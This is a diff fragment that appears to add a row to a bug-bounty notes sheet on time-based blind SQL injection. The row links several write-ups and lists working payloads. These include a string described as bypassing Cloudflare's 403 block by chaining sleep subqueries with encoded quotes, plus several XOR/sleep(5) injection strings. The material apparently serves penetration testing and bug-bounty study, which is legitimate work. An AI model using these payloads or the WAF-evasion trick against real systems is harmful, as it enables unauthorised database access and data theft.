@@ -1,3 +1,13 @@
+29	Time based SQLI	https://medium.com/@kshunya/how-i-got-time-based-sql-injection-in-an-old-public-bug-bounty-program-f6260cd4e75e	https://cyb3rmind.medium.com/2-bug-bounty-poc-time-based-sql-injection-to-dump-database-f8cfa089f393	https://cyb3rmind.medium.com/4-bug-bounty-series-exploiting-boolean-based-sql-injection-3455d800892e	https://medium.com/@kshunya/how-i-got-time-based-sql-injection-in-an-old-public-bug-bounty-program-f6260cd4e75e	https://marxchryz.medium.com/my-bug-bounty-journey-and-my-first-critical-bug-time-based-blind-sql-injection-aa91d8276e41	"Cloudflare 403 bypass to time-based blind SQLi:
+
+PL: (select(0)from(select(sleep(10)))v) → 403
+but PL: (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C""%2B(select(0)from(select(sleep(6)))v) → Time-based Blind SQLi  ; https://media.licdn.com/dms/image/v2/D5622AQFS-xcOY8_I2g/feedshare-shrink_800/B56ZdscvlkGQAo-/0/1749871164925?e=1753920000&v=beta&t=zPsg6PvzIqsivB7-NEqZWe4RefsIYkxgSJIkfdIEhos"	"0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z 
+0'XOR(if (now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(), sleep(5),0)
+'XOR(if(now()=sysdate(), sleep(5),0))XOR'
+'XOR(if (now()=sysdate(), sleep(5*1),0))OR'"	https://medium.com/@anonymousshetty2003/sql-injection-in-hidden-contact-form-parameter-660bd1281491								
+
+
 "SQL Tips
 I Found SQL Blind in User-Agent
 
